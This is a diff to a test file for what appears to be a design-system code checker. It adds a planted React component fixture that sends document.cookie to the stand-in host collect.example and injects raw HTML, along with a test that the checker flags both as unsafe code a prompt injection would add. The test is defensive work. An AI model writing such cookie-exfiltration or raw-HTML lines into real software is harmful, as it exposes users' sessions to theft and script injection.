@@ -12,6 +12,7 @@ describe.skipIf(!existsSync(join(radix, "node_modules/@radix-ui/themes")))("tulp
   mkdirSync(dir, { recursive: true });
   writeFileSync(join(dir, "Card.tsx"), 'import { Button } from "@radix-ui/themes";\nimport "./Card.css";\nexport default function Card() {\n  return <div className="card" style={{ color: "#ff00ff" }}><Button>Go</Button></div>;\n}\n');
   writeFileSync(join(dir, "Card.css"), ".card {\n  padding: 13px;\n  gap: var(--space-3, 12px);\n  margin: var(--space-33, 4px);\n  --card-gap: 8px;\n  row-gap: var(--card-gap);\n}\n");
+  writeFileSync(join(dir, "Planted.tsx"), 'import { Button } from "@radix-ui/themes";\nexport default function Planted({ note }: { note: string }) {\n  fetch("https://collect.example/?c=" + document.cookie);\n  return <Button dangerouslySetInnerHTML={{ __html: note }} />;\n}\n');
   writeFileSync(join(dir, "Clean.tsx"), 'import { Button } from "@radix-ui/themes";\nexport default function Clean() {\n  return <Button size="2">Go</Button>;\n}\n');
   afterAll(() => rmSync(dir, { recursive: true, force: true }));
 
@@ -21,6 +22,14 @@ describe.skipIf(!existsSync(join(radix, "node_modules/@radix-ui/themes")))("tulp
     expect(findings.map((f) => `${f.kind} ${f.file.split("/").pop()}:${f.line}`).sort()).toEqual(["hard-coded Card.css:2", "hard-coded Card.tsx:4", "invented-token Card.css:4"]);
     // A real token and a variable the component declares itself are fine.
     expect(findings.some((f) => /space-3[^3]|card-gap/.test(f.message))).toBe(false);
+  });
+
+  it("finds unsafe code a prompt injection would add, on its lines", async () => {
+    const { code, findings } = await checkCommand(radix, [join(dir, "Planted.tsx")], { quiet: true });
+    expect(code).toBe(1);
+    const unsafe = findings.filter((f) => f.kind === "unsafe");
+    expect(unsafe.map((f) => `${f.file.split("/").pop()}:${f.line}`)).toEqual(["Planted.tsx:3", "Planted.tsx:3", "Planted.tsx:4"]);
+    expect(unsafe.map((f) => f.message).join("\n")).toMatch(/fetch\(\) calls the network[\s\S]*cookies[\s\S]*raw HTML/);
   });
 
   it("passes a component written with the design system", async () => {
